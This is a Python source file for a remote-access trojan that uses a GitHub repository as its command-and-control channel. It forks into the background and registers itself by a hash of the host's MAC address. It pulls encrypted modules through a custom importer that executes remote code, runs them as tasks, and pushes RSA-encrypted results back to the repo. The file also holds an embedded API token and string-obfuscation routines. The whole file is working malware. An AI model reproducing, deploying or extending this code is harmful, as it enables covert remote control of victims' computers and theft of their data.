import json
import base64
import sys
import time
import imp
import os
import threading
import Queue
import zlib
import zipfile
import StringIO
import Queue
import xxhash
import random
from uuid import getnode as get_mac
from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_OAEP
from github3 import login

#class to hold configuration settings
class Config:
	def __init__(self):
		#strings should be obfuscated
		self.mod = "modules/" #path to modules directory
		self.config = "config/"#path to config files directory
		self.data = "data/" #path of directory to upload data to
		self.repo = "wendigo_test" #name of repo
		self.usr = "daniellohrey" #username of repo owner
		#token to use git api
		self.token = "ZWQ2YTVjZTQwYTU0NDM0MmNkMjJiZGI3MDUwN2MyMWRlMzIxNjBjMw=="
		#public key to encrypt data
		self.pk = "LS0tLS1CRUdJTiBQVUJMSUMgS0VZLS0tLS0KTUlJQklqQU5CZ2txaGtpRzl3MEJBUUVGQUFPQ0FROEFNSUlCQ2dLQ0FRRUFwVzBJRktuZWpiRWtROWt1OTMxeApLRHRJNVRncGJuK3htQ0RKcTZIOWlCOFZxZGJSdTZKUUE0ZjRrM0g3N09yU0ZxWm1EUDZDUkpCN0wwSzhBa2RnCmppaGVYR1RITmdaMkRxbmpvVHBvamM3VWVPMy9SdU5ZZnNXQUEzZWx5NmxkMmN3VDdaTStqNHk0NVVXS2o1aVgKeEZpYk9uVnVnMllhczQ3bEY2VXNjRXBpVXJSbnQyTlB6VFJxYkJneDk4ald5TUY1UGJZa2NtSXU4VkVBbE9FLwo4azEyREhkNndpTmtJSDNMYnN2cER1dDNDcHljMVVqTGhqMzJTRGZSWmpkV2R5K2ZPbmg5MEFTV1NQMlFKVGhQCmRhQXh4cng2ZzRMRkJjQWtWYjhYN1JmUGFOc1d2UUhZTGJtd1FPTzRvdXVrczcvV25MNnlXWW8yNGJqMUlpSzkKTHdJREFRQUIKLS0tLS1FTkQgUFVCTElDIEtFWS0tLS0t"
		self.pwd = "password" #password on zipped files
		self.sleep = "10" #time to sleep between checking for config files
		#seed to generate filenames, also key to module key
		self.fn_s = "fn_mod"
		#seed to generate ids, also used as sleep key
		self.id_s = "id_slp"
		self.imp = "import %s"
		self.size = "200" #less than block size of cipher
		self.size = int(self.fixstr(self.size))
		self.sleep = int(self.fixstr(self.sleep))
		self.u_id() #generate a new id on start
		self.u_pk(self.pk) #import public key into cipher object
		random.seed()

	#generates a new id by hashing time and seed
	def u_id(self):
		t_id = str(get_mac()) + self.g_id_s() #id based on mac or is random
		self.id = str(xxhash.xxh64(t_id).hexdigest())
		self.id = self.obfstr(self.id)

	#returns deobfuscated id
	def g_id(self):
		return self.fixstr(self.id)

	#return deobfuscated module path
	def g_mod(self):
		return self.fixstr(self.mod)

	#obfuscates and stores new module path
	def u_mod(self, new):
		self.mod = self.obfstr(new)
		return

	#returns deobfuscated config file path
	def g_config(self):
		return self.fixstr(self.config) + self.g_id()

	#sets new obfuscated config file path
	def u_config(self, new):
		self.config = self.obfstr(new)
		return

	#returns deobfuscated data path to new data file
	def g_data(self):
		return self.fixstr(self.data) + self.g_id() + "/" + self.g_fn()

	#sets new obfuscated data path
	def u_data(self, new):
		self.data = self.obfstr(new)
		return

	#returns deobfuscated username
	def g_usr(self):
		return self.fixstr(self.usr)

	#sets new obfuscated username
	def u_usr(self, new):
		self.usr = self.obfstr(new)
		return

	#returns deobfuscated token
	def g_token(self):
		return base64.b64decode(self.fixstr(self.token))

	#sets new obfuscated token
	def u_token(self, new):
		self.token = self.obfstr(base64.b64encode(new))
		return

	#returns deobfuscated repo name
	def g_repo(self):
		return self.fixstr(self.repo)

	#sets new obfuscated repo name
	def u_repo(self, new):
		self.repo = self.obfstr(new)
		return

	#creates new crypto object from new public key
	def u_pk(self, new):
		new = base64.b64decode(self.fixstr(new))
		self.pk = new
		self.pk = RSA.importKey(self.pk)
		self.pk = PKCS1_OAEP.new(self.pk)
		return

	#returns deobfuscated zip password
	def g_pwd(self):
		return self.fixstr(self.pwd)

	#sets new obfuscated zip password
	def u_pwd(self, new):
		self.pwd = self.obfstr(new)
		return

	#generates a random filename for a data file
	def g_fn(self):
		i_time = int(time.time())
		fn = str(i_time) + self.g_fn_s()
		return xxhash.xxh64(fn).hexdigest()

	#generates a random commit message for creating/updating files
	def g_com(self):
		com = str(time.time())
		return xxhash.xxh64(com).hexdigest()

	#returns string to call import at runtime
	def g_imp(self):
		return self.fixstr(self.imp)

	#returns string used as seed and index
	#need to update old references to fn_s/id_s
	def g_fn_s(self):
		return self.fixstr(self.fn_s)

	#returns string used as seed and index
	def g_id_s(self):
		return self.fixstr(self.id_s)

	#updates seed/index string
	def u_id_s(self, new):
		self.id_s = self.obfstr(new)
		return

	#updates seed/index string
	def u_fn_s(self, new):
		self.fn_s = self.obfstr(new)
		return

	def g_sleep(self):
		return random.randint(self.sleep, self.sleep + self.sleep)

	#deobfuscates strings
	def fixstr(self, o_str):
		return o_str #dont obfuscate while testing
		i = 0
		n_str = ""
		for c in o_str:
			if i % 2 == 1:
				n_str += c
			i += 1
		return n_str

	#obfuscates strings
	def obfstr(self, f_str):
		return f_str #dont obfuscate while testing
		i_time = int(time.time())
		t_id = str(i_time) + self.g_id_s()
		h = str(xxhash.xxh64(t_id).hexdigest())
		i = 0
		o_str = ""
		for c in f_str:
			o_str += h[i % len(h)]
			o_str += c
			i += 1
		o_str += h[i % len(h)]
		return o_str

#class to update pythons import functionality to grab modules from github
class ReImp(object):
	def __init__(self):
		self.code = ""

	def find_module(self, fullname, path = None): #get file from github
		lib = get_file(config.g_mod() + fullname)
		if lib is not None:
			self.code = lib
			return self
		return None

	def load_module(self, name): #load file into new module
		module = imp.new_module(name)
		exec self.code in module.__dict__
		sys.modules[name] = module
		return module

#connects to github and return repo object
def connect():
	gh = login(token = config.g_token())
	repo = gh.repository(config.g_usr(), config.g_repo())
	return repo

#downloads file from github and decrypts it
def get_file(path):
	try:
		repo = connect()
		return decrypt(repo.file_contents(path).decoded)
	except:
		return None

#creates an empty config file (with random data) to register
def create_config():
	#uncaught exception if we cant connect (ie no internet) to loop create
	repo = connect()
	try: #catch exception if creating file fails because it already exists
		repo.create_file(config.g_config(), config.g_com(), config.g_com())
	except:
		pass
	return

#gets config file, imports unimported modules and returns a dictionary of tasks
def get_config():
	c_json = get_file(config.g_config())
	try:
		c_dict = json.loads(c_json)
		for mod in c_dict:
			if mod[config.g_fn_s()] not in sys.modules:
				exec(config.g_imp() % mod[config.g_fn_s()])
		return c_dict
	except:
		return None

#clears config file once tasks have been read
def clear_config():
	repo = connect()
	repo.file_contents(config.g_config()).update(config.g_com(), config.g_com())

#encrypts data returned from tasks and pushes it to github
def push_data(data):
	repo = connect()
	repo.create_file(config.g_data(), config.g_com(), encrypt(data))
	return

#decrypts modules and config files
#decrypted = zip(base64(data))
def decrypt(data):
#	return data #dont encrypt while testing
	decoded = base64.b64decode(data)
	s_io = StringIO.StringIO(decoded) #open
	zipped = zipfile.ZipFile(s_io, 'r')
	#file name in archive needs to be fn_s
	uzip = zipped.read(config.g_fn_s(), config.g_pwd()) #returns file as bytes
	zipped.close()
	s_io.close()
	return uzip

#encrypts data before pushing it to github
#encrypted = base64(rsa(zip(data)))
def encrypt(data):
#	return data #dont encrypt while testing
	key = config.pk
	size = config.size #size needs to be less then 256 (key size in bytes)
	offset = 0
	encrypted = ""
	compressed = zlib.compress(data)
	while offset < len(compressed):
		chunk = compressed[offset:offset+size]
		#dont need to pad because the cipher does it
		encrypted += key.encrypt(chunk)
		offset += size
	return base64.b64encode(encrypted)

#runs module in new thread and then pushes results to github
def run_module(**task):
	try:
		global config
		#config is passed to module and returned to update config options
		conf, result = sys.modules[task[config.g_fn_s()]].run(config, **task)
	except:
		#exit if we cant run
		return

	if conf is not None:
		config = conf
	while True:
		#were in a separate thread so we just keep trying to push data
		try:
			if result is not None:
				push_data(result)
			else:
				s = str(time.time()) + ":" + str(task[config.g_fn_s()])
				push_data(s)
			return
		except:
			time.sleep(config.g_sleep())

#runs all queued modules in new threads
def module_runner():
	global tasks
	while not tasks.empty():
		task = tasks.get()
		t = threading.Thread(target = run_module, kwargs = task)
		t.daemon = True
		t.start()
		try:
			time.sleep(int(task[config.g_id_s()]))
		except:
			pass
	return

#main
try:
	pid = os.fork() #fork and exit
	if pid != 0: #run in child process
		sys.exit()
except:
	pass #dont worry if we cant fork
config = Config() #create config object
sys.meta_path = [ReImp()] #add remote import to the import path
tasks = Queue.Queue() #task queue
while True: #keep trying to create config file until successful
	try:
		create_config() #create a blank config file to register
		break
	except:
		time.sleep(config.g_sleep())
while True: #keep checking for and running new tasks
	if tasks.empty(): #get config file when all tasks have been finished
		config_file = get_config()
		if config_file == None:
			time.sleep(config.g_sleep()) #sleep if there are no new tasks
			continue
		for task in config_file:
			tasks.put(task) #if there are tasks add them to the queue
	if not tasks.empty(): #run tasks in queue and then clear config file
		module_runner()
		while True: #keep trying otherwise well keep running same modules
			try:
				clear_config()
				break
			except:
				time.sleep(config.g_sleep())
